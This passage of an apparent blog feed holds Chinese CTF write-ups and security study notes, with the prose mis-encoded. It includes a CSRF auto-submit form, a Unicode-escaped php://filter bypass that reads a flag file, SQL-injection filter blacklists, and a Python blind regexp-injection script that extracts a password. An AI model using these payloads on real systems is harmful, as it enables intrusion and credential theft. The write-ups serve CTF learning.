¼å¼çš„ä¸€ä¸€åŒ¹é…è¿›è¡Œå—…æ¢ï¼Œååœ¨æµè§ˆå™¨ä¸­è¿›è¡Œç›¸åº”çš„è§£ææ˜¾ç¤ºã€‚</p><p>åœ¨è¯·æ±‚å“åº”ä¸å…·å¤‡æ°å½“çš„MIMEç±»å‹æ—¶ï¼Œæµè§ˆå™¨çš„å…·ä½“æ£€æµ‹å’Œè§£ææœºåˆ¶å¯èƒ½ä¼šå¯¼è‡´å¯¹æ–‡ä»¶æˆ–å›¾ç‰‡çš„ä¸æ­£ç¡®è§£æï¼Œå¯¼è‡´æ­¤ç±»æ¼æ´çš„å‘ç”Ÿä¸åˆ©ç”¨ã€‚</p><p>Encoding Sniffingåˆ™åˆ©ç”¨æµè§ˆå™¨çš„è‡ªåŠ¨è¯†åˆ«è€ŒWAFéš¾ä»¥æ”¯æŒçš„ç‰¹ç‚¹(å¦‚ï¼šUTF-7ã€UTF-32)å®Œæˆæ”»å‡»ï¼Œä¹‹å‰åšè¿‡ä¸€ä¸ªxmlè½¬ç å®Œæˆæ”»å‡»çš„é¢˜ã€‚</p><p>facebookä½¿ç”¨å­åŸŸæ¥æ‰˜ç®¡å›¾ç‰‡ï¼Œé˜²æ­¢å› æ­¤ç±»æ¼æ´é€ æˆçš„xssæ”»å‡»ã€‚å³ä½¿æ”»å‡»å®Œæˆï¼Œè·å–åˆ°çš„ä¹Ÿå¯èƒ½ä»…ä»…æ˜¯å­åŸŸä¸‹çš„ä¸€ä¸ªcookieã€‚</p></blockquote><p>7.åŒæºç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿé™åˆ¶æ˜¯ä»€ä¹ˆï¼Ÿæµè§ˆå™¨åœ¨é‡åˆ°å“ªä¸¤ç§æƒ…å†µçš„æ—¶å€™ä¼šç”¨åˆ°åŒæºç­–ç•¥ï¼Ÿå¦‚ä½•æ”¾æ¾SOPé™åˆ¶ï¼Ÿæ”¾æ¾SOPé™åˆ¶ä¼šå¯¹æµè§ˆå™¨æ’ä»¶å®‰å…¨é€ æˆæ€æ ·çš„ç ´åï¼Ÿ</p><blockquote><p><strong>åŒæºç­–ç•¥ï¼ˆSOPï¼‰</strong></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a></p><p>Webå®‰å…¨çš„åŸºçŸ³ã€‚åŒæºç­–ç•¥ç›®çš„åœ¨äºé˜²æ­¢Webäº¤äº’é—´çš„ä¸å®‰å…¨è¡Œä¸ºã€‚åŒæºç­–ç•¥é™åˆ¶äº†è·¨åŸŸçš„èµ„æºè®¿é—®ã€‚</p><p><strong>é™åˆ¶</strong>ï¼šåè®®ã€ç«¯å£å·ã€ä¸»æœºï¼ˆåŸŸåï¼‰å¿…é¡»ç›¸åŒã€‚</p><p>ä¸åŒåŸŸä¹‹é—´æ˜¯é€šè¿‡XMLçš„HTTPè¯·æ±‚æ¥å®ç°äº¤äº’çš„ï¼Œä¹Ÿå°±æ˜¯AJAXè¯·æ±‚ã€‚SOPä¼šé™åˆ¶æ¥è‡ªiframeå’Œwindowså±æ€§çš„è·¨åŸŸè®¿é—®å’ŒAJAXè¯·æ±‚ï¼Ÿæ‰€ä»¥å½“æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ªå¸¦æœ‰JSè„šæœ¬çš„æ–°çª—å£ï¼Œç”±äºSOPçš„å½±å“ï¼Œé‚£ä¹ˆå°±æ— æ³•å¯¹è¯¥çª—å£ä¸­çš„DOMå…ƒç´ å®ç°è®¿é—®ã€‚</p><p><strong>å¼±åŒ–SOP</strong>ï¼šå¯ä»¥é€šè¿‡è®¾ç½®ä¸åŒåŸŸä¹‹é—´çš„document.domainè„šæœ¬æ¥å®ç°ã€‚è¿™ç§æ–¹å¼å¯ä»¥è®©æœ¬è´¨ä¸Šä¸åŒæºçš„å­åŸŸå®ç°äº’ç›¸é€šä¿¡ä¸äº¤äº’ã€‚æˆ–è€…ï¼Œé€šè¿‡postMessageæ–¹æ³•å®ç°è·¨çª—å£é€šä¿¡ã€‚</p><p><strong>ç ´å</strong>ï¼šè·¨åŸŸè·¨çª—å£çš„ä¿¡æ¯éªŒè¯å¾ˆå°‘å­˜åœ¨ï¼Œè€ŒWebæ’ä»¶çš„å†…éƒ¨æ¶ˆæ¯å¤„ç†ç»å¸¸æ˜¯é”™è¯¯çš„ã€‚å¦‚ï¼šChromeçš„æ‹“å±•æ’ä»¶å°±å­˜åœ¨SOPç»•è¿‡æ¼æ´ã€‚Chromeçš„æ‹“å±•æ’ä»¶åœ¨æµè§ˆå™¨å‡†å¤‡çš„sandboxä¸­å—åˆ°äº†å¾ˆå¤šé™åˆ¶ï¼Œæ‰€ä»¥è¿™äº›æ’ä»¶å¸¸ä½¿ç”¨postMessageè¿›è¡Œè®¾è®¡ã€‚å½“æˆ‘ä»¬å‘æ’ä»¶å‘é€ä¿¡æ¯æ—¶ï¼Œå¯ä»¥é€šè¿‡è·¨çª—å£é€šä¿¡ç»•è¿‡SOPï¼Œå®é™…ä¸Šè¿™å·²ç»ç ´ç¯äº†æµè§ˆå™¨å‡†å¤‡çš„sandboxï¼Œæ˜¯ç”±SOPå¼±åŒ–å¯¼è‡´çš„æ¼æ´ã€‚</p></blockquote><p>8.csrfæ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•è®¾è®¡è§„é¿csrfï¼Ÿè§†é¢‘ä¸­æåˆ°çš„é”™è¯¯çš„csrfé…ç½®æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Ÿ </p><blockquote><p><strong>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰</strong></p><p>æ”»å‡»è€…æŒŸæŒå—å®³è€…å»è®¿é—®ç”±æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ã€‚å¹¶ä»¥å—å®³è€…èº«ä»½æ‰§è¡Œè¯·æ±‚ã€æäº¤ç­‰æ¶æ„æ“ä½œã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;xxxx&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1625&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯·æ±‚ç›´æ¥å‘é€è‡³åç«¯ï¼Œè€Œåç«¯æ— æ³•åˆ†è¯·è¯·æ±‚æ˜¯å¦æ˜¯ä¼ªé€ çš„ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨CSRF-Tokenæ¥è§„é¿æ­¤ç±»æ”»å‡»ã€‚Tokenéšæœºç”Ÿæˆå¹¶åµŒå…¥è¡¨å•ä¸­ï¼ˆCSPâ€¦â€¦?å“¦ï¼Œä¸ä¸€æ ·â€¦â€¦</p><p>å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;xxxx&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è§†é¢‘ä¸­æåˆ°æœ‰Webåº”ç”¨é€šè¿‡åŠ è½½csrf.jsæ¥ç”Ÿæˆtokenï¼Œæ³„éœ²äº†tokençš„ç”Ÿæˆæ–¹å¼ï¼Œè¿™æ˜¯ä¸€ç§è‡ªæ¯çš„é˜²å¾¡æªæ–½ã€‚</p></blockquote><p>é™„åŠ é¢˜ï¼š5ã€6ä¸¤ç‚¹ä¸»è¦åˆ©ç”¨çš„æ˜¯ç”±äºæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯å¯¹åŒä¸€ä¿¡æ¯çš„å¤„ç†æ–¹å¼ä¸åŒé€ æˆçš„æ¼æ´ï¼Œä½ è¿˜èƒ½ä¸¾å‡ºç›¸ä¼¼çš„ä¾‹å­ä¹ˆï¼Ÿï¼ˆ1åˆ†ï¼‰</p><blockquote><p>â€¦â€¦â€¦â€¦</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;hacker101-2&quot;&gt;&lt;a href=&quot;#hacker101-2&quot; class=&quot;headerlink&quot; title=&quot;hacker101.2&quot;&gt;&lt;/a&gt;hacker101.2&lt;/h5&gt;&lt;p&gt;ä¸­æ–‡è§†é¢‘ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HarekazeCTF-2019-encode_and_encode</title>
    <link href="http://example.com/2021/05/04/HarekazeCTF-2019-encode-and-encode/"/>
    <id>http://example.com/2021/05/04/HarekazeCTF-2019-encode-and-encode/</id>
    <published>2021-05-04T10:39:32.000Z</published>
    <updated>2021-05-04T10:53:40.157Z</updated>
    
    <content type="html"><![CDATA[<h3 id="HarekazeCTF-2019-encode-and-encode"><a href="#HarekazeCTF-2019-encode-and-encode" class="headerlink" title="HarekazeCTF-2019-encode_and_encode"></a>HarekazeCTF-2019-encode_and_encode</h3><p>ä¸Šæ¥å°±æ˜¯æºç â€¦â€¦ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//æ¥å—postæ•°æ®</span></span><br><span class="line">$json = json_decode($body, <span class="literal">true</span>);<span class="comment">//jsonè§£å¯†ï¼Œæ•…bodyéœ€è¦ä¸ºåˆæ³•jsonå­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">&#x27;page&#x27;</span>])) &#123;<span class="comment">//bodyä¸­éœ€å«æœ‰pageå­—æ®µ</span></span><br><span class="line">  $page = $json[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  $content = file_get_contents($page);<span class="comment">//è¯»å–</span></span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;<span class="comment">//è¿‡æ»¤ä¼ å‚ï¼Œä¸€äº›ä¼ªåè®®ï¼Œflag</span></span><br><span class="line">    $content = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; $content]);</span><br></pre></td></tr></table></figure><p>is_validè¿‡æ»¤äº†å¾ˆå¤šåè®®è¿˜æœ‰éå†ï¼Œéšä¾¿èµ·åè®®åå†éå†è¯»å–æ˜¯ä¸èƒ½ç”¨äº†â€¦â€¦</p><h3 id="jsonè½¬ä¹‰"><a href="#jsonè½¬ä¹‰" class="headerlink" title="jsonè½¬ä¹‰"></a>jsonè½¬ä¹‰</h3><p>jsonä¸ºæä¾›ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„ä¼ è¾“ï¼Œæ”¯æŒäº†Unicodeï¼Œå¦‚ï¼šjson_encodeä¼šå°†ä¸­æ–‡è½¬æ¢ä¸ºunicodeç¼–ç </p><p>æ‰€ä»¥æ­¤å¤„ä½¿ç”¨Unicodeå³å¯ç»•è¿‡æ£€æŸ¥ã€‚</p><blockquote><p>{ â€œpageâ€ : â€œ\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067â€}</p></blockquote><p>flag{5c3db6bf-f5c9-4926-a809-ea7b4d23c37d}</p><p>è·å¾—flagâ€¦â€¦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;HarekazeCTF-2019-encode-and-encode&quot;&gt;&lt;a href=&quot;#HarekazeCTF-2019-encode-and-encode&quot; class=&quot;headerlink&quot; title=&quot;HarekazeCTF-2019-encode_</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NCTF2019-SQLi</title>
    <link href="http://example.com/2021/05/04/NCTF2019-SQLi/"/>
    <id>http://example.com/2021/05/04/NCTF2019-SQLi/</id>
    <published>2021-05-04T09:42:27.000Z</published>
    <updated>2021-05-04T10:24:48.401Z</updated>
    
    <content type="html"><![CDATA[<h3 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h3><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•æ¡†æ³¨å…¥</p><blockquote><p>sqlquery : select * from users where username=â€™â€™ and passwd=â€™â€™</p></blockquote><p>æ ‡è¯†äº†æŸ¥è¯¢è¯­å¥ï¼Œæµ‹è¯•ï¼š</p><img src="/images/NCTF2019-SQLi/image-20210504174454423.png" alt="image-20210504174454423" style="zoom:80%;" /><p>è¿‡æ»¤äº†å¾ˆå¤šâ€¦â€¦</p><p>robots.txtä¸­æœ‰hintï¼Œæç¤ºäº†è¿‡æ»¤è§„åˆ™ä¸flagè·å–æ–¹å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list = <span class="string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> $_POST[<span class="string">&#x27;passwd&#x27;</span>] === admin<span class="string">&#x27;s password,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then you will get the flag;</span></span><br></pre></td></tr></table></figure><p>å¼•å·è¢«è¿‡æ»¤ï¼Œç”¨è½¬ä¹‰ï¼š</p><blockquote><p>username=a&amp;passwd=/**/||1;%00</p></blockquote><p>ç»“æœæ°¸çœŸï¼Œæ­¤æ—¶reså‡ºç°äº†å˜åŒ–ï¼š</p><img src="/images/NCTF2019-SQLi/image-20210504174832423.png" alt="image-20210504174832423" style="zoom:80%;" /><p>å®é™…ä¸Šï¼Œè¿™ä¸ªé¡µé¢å¹¶ä¸å­˜åœ¨â€¦â€¦</p><p>æˆ‘é™·å…¥äº†æ²‰æ€â€¦â€¦</p><h3 id="regexpæ³¨å…¥"><a href="#regexpæ³¨å…¥" class="headerlink" title="regexpæ³¨å…¥"></a>regexpæ³¨å…¥</h3><p><a href="https://xz.aliyun.com/t/8003">https://xz.aliyun.com/t/8003</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;\&amp;passwd&#x3D;&#x2F;**&#x2F;||username&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^admin&quot;;%00</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæ³¨å…¥è¯­å¥ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;xxx&#39;&#x2F;**&#x2F;||username&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^admi&quot;;%00</span><br></pre></td></tr></table></figure><p>å¯¹usernameå­—æ®µè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œä¸€ä¸ªä¸ªç§»ä½åŒ¹é…â€¦â€¦ï¼ˆåˆæ˜¯ç§»ä½åŒ¹é…â€¦â€¦</p><p>å†™è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://9424a242-edab-424f-b620-ceca992f2e55.node3.buuoj.cn/&quot;</span></span><br><span class="line">string=<span class="string">&quot;1234567890qwertyuiopasdfghjklzxcvbnm_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&#x27;/**/||passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#x27;</span>.<span class="built_in">format</span>(flag+s)+<span class="built_in">chr</span>(<span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(pay)</span></span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;welcome.php&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="comment"># time.sleep(0.03)</span></span><br><span class="line">            flag += s</span><br><span class="line">            print(s)</span><br><span class="line">            print(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/images/NCTF2019-SQLi/image-20210504182318273.png" alt="image-20210504182318273" style="zoom:80%;" /><p><img src="/images/NCTF2019-SQLi/image-20210504182429861.png" alt="image-20210504182429861"></p><p>å¾—åˆ°flagâ€¦â€¦</p><p>å®˜æ–¹wpï¼š</p><p><a href="http://yulige.top/?p=752#SQLi500pt_11solvers">http://yulige.top/?p=752#SQLi500pt_11solvers</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;NCTF2019-SQLi&quot;&gt;&lt;a href=&quot;#NCTF2019-SQLi&quot; class=&quot;headerlink&quot; title=&quot;[NCTF2019]SQLi&quot;&gt;&lt;/a&gt;[NCTF2019]SQLi&lt;/h3&gt;&lt;p&gt;è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•æ¡†æ³¨å…¥&lt;/p&gt;
&lt;blockq</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SWPUCTF-2018-SimplePHP</title>
    <link href="http://example.com/2021/05/04/SWPUCTF-2018-SimplePHP/"/>
    <id>http://example.com/2021/05/04/SWPUCTF-2018-SimplePHP/</id>
    <published>2021-05-04T06:17:42.000Z</published>
    <updated>2021-05-04T08:51:00.026Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>è¿›å…¥é¢˜ç›®ï¼Œæœ‰ä¸€ä¸ªfileå‚æ•°ï¼Œå°è¯•ä¸€ä¸‹ä¼ªåè®®ï¼Œæ— æœâ€¦â€¦</p><p>ç»“æœç›´æ¥è¯»å¯ä»¥è¯»å‡ºæ¥</p><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>] ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    $temp = explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span 